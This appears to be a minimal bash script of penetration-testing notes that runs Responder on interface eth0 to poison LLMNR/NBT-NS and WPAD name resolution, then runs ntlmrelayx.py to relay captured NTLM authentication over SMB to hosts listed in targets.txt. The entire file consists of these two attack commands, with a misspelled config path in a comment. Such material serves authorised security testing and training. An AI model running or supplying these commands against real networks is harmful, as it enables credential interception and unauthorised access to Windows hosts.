#!/bin/bash

# Conf file
# /usr/share/responder/Respinder.conf

# Listen
python Responder.py -I eth0 -rdw -v


# Relay
python ntlmrelayx.py -tf targets.txt -smb2support



